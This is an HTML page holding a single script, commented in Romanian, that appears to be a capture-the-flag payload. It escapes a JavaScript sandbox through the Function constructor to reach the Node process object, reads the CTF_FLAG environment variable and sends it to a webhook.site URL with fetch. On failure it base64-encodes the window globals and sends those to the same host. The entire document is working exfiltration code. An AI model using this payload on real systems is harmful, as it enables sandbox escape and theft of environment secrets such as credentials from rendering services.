<!DOCTYPE html><!DOCTYPE html>
<html>
<body>
    <script>
        try {
            // Folosim o metodă de evadare din sandbox prin prototipul funcțiilor
            const getProcess = Function('return this.process || (this.constructor.constructor("return process")())');
            const proc = getProcess();
            
            // Extragem flag-ul
            const flag = proc.env.CTF_FLAG || "FLAG_NEIDENTIFICAT";

            // Trimitem flag-ul către tine
            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + encodeURIComponent(flag));
            
        } catch (e) {
            // Dacă dă eroare, trimitem toate variabilele globale să vedem unde e ascuns flag-ul
            const globals = Object.keys(window).join(',');
            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?BACKUP_KEYS=" + btoa(globals));
        }
    </script>
</body>
</html>
